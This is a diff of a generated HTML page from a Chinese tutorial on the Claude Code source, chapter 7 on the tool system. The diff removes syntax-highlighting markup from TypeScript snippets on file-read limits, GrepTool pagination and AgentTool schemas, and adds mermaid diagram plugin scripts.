-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BLOCKED_DEVICE_PATHS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>([
-  <span class="hljs-string">'/dev/zero'</span>, <span class="hljs-string">'/dev/random'</span>, <span class="hljs-string">'/dev/urandom'</span>, <span class="hljs-string">'/dev/full'</span>,  <span class="hljs-comment">// 无限输出</span>
-  <span class="hljs-string">'/dev/stdin'</span>, <span class="hljs-string">'/dev/tty'</span>, <span class="hljs-string">'/dev/console'</span>,                  <span class="hljs-comment">// 阻塞等待输入</span>
-  <span class="hljs-string">'/dev/stdout'</span>, <span class="hljs-string">'/dev/stderr'</span>,                              <span class="hljs-comment">// 无意义读取</span>
-  <span class="hljs-string">'/dev/fd/0'</span>, <span class="hljs-string">'/dev/fd/1'</span>, <span class="hljs-string">'/dev/fd/2'</span>,                    <span class="hljs-comment">// stdio 别名</span>
+<pre><code class="lang-typescript">const BLOCKED_DEVICE_PATHS = new Set([
+  '/dev/zero', '/dev/random', '/dev/urandom', '/dev/full',  // 无限输出
+  '/dev/stdin', '/dev/tty', '/dev/console',                  // 阻塞等待输入
+  '/dev/stdout', '/dev/stderr',                              // 无意义读取
+  '/dev/fd/0', '/dev/fd/1', '/dev/fd/2',                    // stdio 别名
 ])
 </code></pre>
 <h3 id="792-token-限制">7.9.2 Token 限制</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MaxFileReadTokenExceededError</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Error</span> {
-  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">public</span> <span class="hljs-attr">tokenCount</span>: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">public</span> <span class="hljs-attr">maxTokens</span>: <span class="hljs-built_in">number</span></span>) {
-    <span class="hljs-variable language_">super</span>(<span class="hljs-string">`File content (<span class="hljs-subst">${tokenCount}</span> tokens) exceeds maximum allowed tokens (<span class="hljs-subst">${maxTokens}</span>).`</span>)
+<pre><code class="lang-typescript">export class MaxFileReadTokenExceededError extends Error {
+  constructor(public tokenCount: number, public maxTokens: number) {
+    super(`File content (${tokenCount} tokens) exceeds maximum allowed tokens (${maxTokens}).`)
   }
 }
 </code></pre>
 <p>文件读取有 token 上限，超过时返回错误并建议使用 <code>offset</code>/<code>limit</code> 参数分段读取。</p>
 <h3 id="793-macos-截图路径修复">7.9.3 macOS 截图路径修复</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAlternateScreenshotPath</span>(<span class="hljs-params"><span class="hljs-attr">filePath</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span> {
-  <span class="hljs-keyword">const</span> amPmPattern = <span class="hljs-regexp">/^(.+)([ \u202F])(AM|PM)(\.png)$/</span>
-  <span class="hljs-keyword">const</span> match = filename.<span class="hljs-title function_">match</span>(amPmPattern)
-  <span class="hljs-keyword">if</span> (!match) <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>
-  <span class="hljs-keyword">const</span> alternateSpace = currentSpace === <span class="hljs-string">' '</span> ? <span class="hljs-variable constant_">THIN_SPACE</span> : <span class="hljs-string">' '</span>
-  <span class="hljs-keyword">return</span> filePath.<span class="hljs-title function_">replace</span>(...)
+<pre><code class="lang-typescript">function getAlternateScreenshotPath(filePath: string): string | undefined {
+  const amPmPattern = /^(.+)([ \u202F])(AM|PM)(\.png)$/
+  const match = filename.match(amPmPattern)
+  if (!match) return undefined
+  const alternateSpace = currentSpace === ' ' ? THIN_SPACE : ' '
+  return filePath.replace(...)
 }
 </code></pre>
 <p>macOS 不同版本在截图文件名的 AM/PM 前使用普通空格或窄不间断空格（U+202F），这个函数自动尝试替代路径。</p>
 <h2 id="710-greptool-核心设计">7.10 GrepTool 核心设计</h2>
 <h3 id="7101-基于-ripgrep-的搜索">7.10.1 基于 ripgrep 的搜索</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">GrepTool</span> = <span class="hljs-title function_">buildTool</span>({
-  <span class="hljs-attr">name</span>: <span class="hljs-variable constant_">GREP_TOOL_NAME</span>,
-  <span class="hljs-attr">searchHint</span>: <span class="hljs-string">'search file contents with regex (ripgrep)'</span>,
-  <span class="hljs-attr">maxResultSizeChars</span>: <span class="hljs-number">20_000</span>,  <span class="hljs-comment">// 20K 持久化阈值</span>
-  <span class="hljs-title function_">isConcurrencySafe</span>(<span class="hljs-params"></span>) { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> },
-  <span class="hljs-title function_">isReadOnly</span>(<span class="hljs-params"></span>) { <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> },
-  <span class="hljs-comment">// ...</span>
+<pre><code class="lang-typescript">export const GrepTool = buildTool({
+  name: GREP_TOOL_NAME,
+  searchHint: 'search file contents with regex (ripgrep)',
+  maxResultSizeChars: 20_000,  // 20K 持久化阈值
+  isConcurrencySafe() { return true },
+  isReadOnly() { return true },
+  // ...
 })
 </code></pre>
 <p>GrepTool 是并发安全且只读的——这使得多个 Grep 调用可以并行执行。</p>
 <h3 id="7102-结果分页">7.10.2 结果分页</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_HEAD_LIMIT</span> = <span class="hljs-number">250</span>
+<pre><code class="lang-typescript">const DEFAULT_HEAD_LIMIT = 250
 
-<span class="hljs-keyword">function</span> applyHeadLimit&lt;T&gt;(<span class="hljs-attr">items</span>: T[], <span class="hljs-attr">limit</span>: <span class="hljs-built_in">number</span> | <span class="hljs-literal">undefined</span>, <span class="hljs-attr">offset</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>) {
-  <span class="hljs-keyword">if</span> (limit === <span class="hljs-number">0</span>) {
-    <span class="hljs-keyword">return</span> { <span class="hljs-attr">items</span>: items.<span class="hljs-title function_">slice</span>(offset), <span class="hljs-attr">appliedLimit</span>: <span class="hljs-literal">undefined</span> }  <span class="hljs-comment">// 显式 0 = 无限制</span>
+function applyHeadLimit<t>(items: T[], limit: number | undefined, offset: number = 0) {
+  if (limit === 0) {
+    return { items: items.slice(offset), appliedLimit: undefined }  // 显式 0 = 无限制
   }
-  <span class="hljs-keyword">const</span> effectiveLimit = limit ?? <span class="hljs-variable constant_">DEFAULT_HEAD_LIMIT</span>
-  <span class="hljs-keyword">const</span> sliced = items.<span class="hljs-title function_">slice</span>(offset, offset + effectiveLimit)
-  <span class="hljs-keyword">const</span> wasTruncated = items.<span class="hljs-property">length</span> - offset &gt; effectiveLimit
-  <span class="hljs-keyword">return</span> { <span class="hljs-attr">items</span>: sliced, <span class="hljs-attr">appliedLimit</span>: wasTruncated ? effectiveLimit : <span class="hljs-literal">undefined</span> }
+  const effectiveLimit = limit ?? DEFAULT_HEAD_LIMIT
+  const sliced = items.slice(offset, offset + effectiveLimit)
+  const wasTruncated = items.length - offset &gt; effectiveLimit
+  return { items: sliced, appliedLimit: wasTruncated ? effectiveLimit : undefined }
 }
-</code></pre>
+</t></code></pre>
 <p>默认限制 250 条结果。<code>appliedLimit</code> 只在实际发生截断时设置，让模型知道可以用 <code>offset</code> 分页。</p>
 <h3 id="7103-vcs-目录自动排除">7.10.3 VCS 目录自动排除</h3>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VCS_DIRECTORIES_TO_EXCLUDE</span> = [<span class="hljs-string">'.git'</span>, <span class="hljs-string">'.svn'</span>, <span class="hljs-string">'.hg'</span>, <span class="hljs-string">'.bzr'</span>, <span class="hljs-string">'.jj'</span>, <span class="hljs-string">'.sl'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
+<pre><code class="lang-typescript">const VCS_DIRECTORIES_TO_EXCLUDE = ['.git', '.svn', '.hg', '.bzr', '.jj', '.sl'] as const
 </code></pre>
 <p>搜索时自动排除版本控制目录，避免搜索结果中的噪声。</p>
 <h2 id="711-agenttool-子-agent-启动">7.11 AgentTool 子 agent 启动</h2>
 <h3 id="7111-复杂的输入-schema">7.11.1 复杂的输入 Schema</h3>
 <p>AgentTool 的 schema 是动态构建的，根据 feature flag 组合不同的字段：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> baseInputSchema = <span class="hljs-title function_">lazySchema</span>(<span class="hljs-function">() =&gt;</span> z.<span class="hljs-title function_">object</span>({
-  <span class="hljs-attr">description</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">prompt</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">subagent_type</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>(),
-  <span class="hljs-attr">model</span>: z.<span class="hljs-title function_">enum</span>([<span class="hljs-string">'sonnet'</span>, <span class="hljs-string">'opus'</span>, <span class="hljs-string">'haiku'</span>]).<span class="hljs-title function_">optional</span>(),
-  <span class="hljs-attr">run_in_background</span>: z.<span class="hljs-title function_">boolean</span>().<span class="hljs-title function_">optional</span>()
+<pre><code class="lang-typescript">const baseInputSchema = lazySchema(() =&gt; z.object({
+  description: z.string(),
+  prompt: z.string(),
+  subagent_type: z.string().optional(),
+  model: z.enum(['sonnet', 'opus', 'haiku']).optional(),
+  run_in_background: z.boolean().optional()
 }))
 
-<span class="hljs-keyword">const</span> fullInputSchema = <span class="hljs-title function_">lazySchema</span>(<span class="hljs-function">() =&gt;</span> {
-  <span class="hljs-keyword">const</span> multiAgentInputSchema = z.<span class="hljs-title function_">object</span>({
-    <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>(),
-    <span class="hljs-attr">team_name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>(),
-    <span class="hljs-attr">mode</span>: <span class="hljs-title function_">permissionModeSchema</span>().<span class="hljs-title function_">optional</span>()
+const fullInputSchema = lazySchema(() =&gt; {
+  const multiAgentInputSchema = z.object({
+    name: z.string().optional(),
+    team_name: z.string().optional(),
+    mode: permissionModeSchema().optional()
   })
-  <span class="hljs-keyword">return</span> <span class="hljs-title function_">baseInputSchema</span>().<span class="hljs-title function_">merge</span>(multiAgentInputSchema).<span class="hljs-title function_">extend</span>({
-    <span class="hljs-attr">isolation</span>: z.<span class="hljs-title function_">enum</span>([<span class="hljs-string">'worktree'</span>, <span class="hljs-string">'remote'</span>]).<span class="hljs-title function_">optional</span>(),
-    <span class="hljs-attr">cwd</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">optional</span>()
+  return baseInputSchema().merge(multiAgentInputSchema).extend({
+    isolation: z.enum(['worktree', 'remote']).optional(),
+    cwd: z.string().optional()
   })
 })
 </code></pre>
 <p>根据 feature flag 动态 omit 字段：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> inputSchema = <span class="hljs-title function_">lazySchema</span>(<span class="hljs-function">() =&gt;</span> {
-  <span class="hljs-keyword">const</span> schema = <span class="hljs-title function_">feature</span>(<span class="hljs-string">'KAIROS'</span>) ? <span class="hljs-title function_">fullInputSchema</span>() : <span class="hljs-title function_">fullInputSchema</span>().<span class="hljs-title function_">omit</span>({ <span class="hljs-attr">cwd</span>: <span class="hljs-literal">true</span> })
-  <span class="hljs-keyword">return</span> isBackgroundTasksDisabled || <span class="hljs-title function_">isForkSubagentEnabled</span>()
-    ? schema.<span class="hljs-title function_">omit</span>({ <span class="hljs-attr">run_in_background</span>: <span class="hljs-literal">true</span> })
+<pre><code class="lang-typescript">export const inputSchema = lazySchema(() =&gt; {
+  const schema = feature('KAIROS') ? fullInputSchema() : fullInputSchema().omit({ cwd: true })
+  return isBackgroundTasksDisabled || isForkSubagentEnabled()
+    ? schema.omit({ run_in_background: true })
     : schema
 })
 </code></pre>
 <h3 id="7112-输出类型">7.11.2 输出类型</h3>
 <p>AgentTool 有三种输出类型，形成 discriminated union：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">const</span> syncOutputSchema = <span class="hljs-title function_">agentToolResultSchema</span>().<span class="hljs-title function_">extend</span>({
-  <span class="hljs-attr">status</span>: z.<span class="hljs-title function_">literal</span>(<span class="hljs-string">'completed'</span>),
-  <span class="hljs-attr">prompt</span>: z.<span class="hljs-title function_">string</span>()
+<pre><code class="lang-typescript">const syncOutputSchema = agentToolResultSchema().extend({
+  status: z.literal('completed'),
+  prompt: z.string()
 })
 
-<span class="hljs-keyword">const</span> asyncOutputSchema = z.<span class="hljs-title function_">object</span>({
-  <span class="hljs-attr">status</span>: z.<span class="hljs-title function_">literal</span>(<span class="hljs-string">'async_launched'</span>),
-  <span class="hljs-attr">agentId</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">description</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">prompt</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">outputFile</span>: z.<span class="hljs-title function_">string</span>(),
-  <span class="hljs-attr">canReadOutputFile</span>: z.<span class="hljs-title function_">boolean</span>().<span class="hljs-title function_">optional</span>()
+const asyncOutputSchema = z.object({
+  status: z.literal('async_launched'),
+  agentId: z.string(),
+  description: z.string(),
+  prompt: z.string(),
+  outputFile: z.string(),
+  canReadOutputFile: z.boolean().optional()
 })
 </code></pre>
 <p>此外还有内部类型 <code>TeammateSpawnedOutput</code>（status: <code>'teammate_spawned'</code>）和 <code>RemoteLaunchedOutput</code>（status: <code>'remote_launched'</code>），它们被排除在导出 schema 之外，用于死代码消除。</p>
 <h3 id="7113-子-agent-上下文构建">7.11.3 子 agent 上下文构建</h3>
 <p>AgentTool 通过 <code>assembleToolPool</code> 为子 agent 构建工具池：</p>
-<pre><code class="lang-typescript"><span class="hljs-keyword">import</span> { assembleToolPool } <span class="hljs-keyword">from</span> <span class="hljs-string">'../../tools.js'</span>
+<pre><code class="lang-typescript">import { assembleToolPool } from '../../tools.js'
 </code></pre>
 <p>子 agent 获得独立的权限上下文、工具集和工作目录，但共享父 agent 的消息历史和状态。</p>
 <h2 id="712-小结">7.12 小结</h2>
@@ -1532,7 +1373,7 @@ lspManager.<span class="hljs-title function_">saveFile</span>(absoluteFilePath)
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第7章 - 工具系统架构与实现","level":"4.1","depth":1,"next":{"title":"第9章 - 任务系统与多Agent架构","level":"5.1","depth":1,"path":"第09章-任务系统与多Agent架构.md","ref":"第09章-任务系统与多Agent架构.md","articles":[]},"previous":{"title":"第8章 - 上下文管理与压缩策略","level":"3.3","depth":1,"path":"第08章-上下文管理与压缩策略.md","ref":"第08章-上下文管理与压缩策略.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Claude Code 源码深度教学指南","language":"zh-hans","gitbook":"*","description":"Claude Code v2.1.88 源码从 0 到 1 的深度教学指南"},"file":{"path":"第07章-工具系统架构与实现.md","mtime":"2026-04-01T07:47:02.875Z","type":"markdown"},"gitbook":{"version":"6.1.7","time":"2026-04-03T06:44:50.007Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第7章 - 工具系统架构与实现","level":"4.1","depth":1,"next":{"title":"第9章 - 任务系统与多Agent架构","level":"5.1","depth":1,"path":"第09章-任务系统与多Agent架构.md","ref":"第09章-任务系统与多Agent架构.md","articles":[]},"previous":{"title":"第8章 - 上下文管理与压缩策略","level":"3.3","depth":1,"path":"第08章-上下文管理与压缩策略.md","ref":"第08章-上下文管理与压缩策略.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","mermaid"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"mermaid":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Claude Code 源码深度教学指南","language":"zh-hans","gitbook":"*","description":"Claude Code v2.1.88 源码从 0 到 1 的深度教学指南"},"file":{"path":"第07章-工具系统架构与实现.md","mtime":"2026-04-03T06:45:16.316Z","type":"markdown"},"gitbook":{"version":"6.1.7","time":"2026-04-03T06:57:12.977Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
@@ -1584,6 +1425,14 @@ lspManager.<span class="hljs-title function_">saveFile</span>(absoluteFilePath)
     </script>
     <script src="gitbook/gitbook.js"></script>
     <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/honkit-plugin-mermaid/mermaid-load.js"></script>
+        
+    
+        
+        <script src="gitbook/honkit-plugin-mermaid/mermaid.min.js"></script>
+        
     
         
         <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
